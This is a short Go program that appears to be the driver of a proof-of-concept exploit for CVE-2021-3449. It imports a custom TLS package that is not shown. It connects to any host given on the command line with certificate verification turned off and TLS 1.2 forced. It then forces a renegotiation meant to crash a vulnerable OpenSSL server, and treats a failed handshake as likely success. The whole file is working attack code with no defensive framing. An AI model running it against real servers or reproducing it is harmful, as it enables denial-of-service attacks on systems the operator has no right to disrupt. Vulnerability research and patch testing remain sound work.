package main

import (
	"flag"

	"cve_2021_3449/tls"
)

func main() {
	host := flag.String("host", "", "host:port to connect to")
	flag.Parse()
	// Connect to the target, forcing TLSv1.2
	conn, err := tls.Dial("tcp", *host, &tls.Config{
		InsecureSkipVerify: true,
		Renegotiation:      tls.RenegotiateFreelyAsClient,
		MaxVersion:         tls.VersionTLS12,
	})
	if err != nil {
		panic("failed to connect: " + err.Error())
	}
	println("connected")
	// Force a TLS renegotiation per RFC 5746.
	if err := conn.Handshake(); err != nil {
		println("handshake failed. exploit might have been successful")
		panic("handshake failed: " + err.Error())
	}
	// If the server responded, it is not vulnerable.
	println("renegotiated, exploit failed")
	if err := conn.Close(); err != nil {
		panic("failed to close conn: " + err.Error())
	}
}
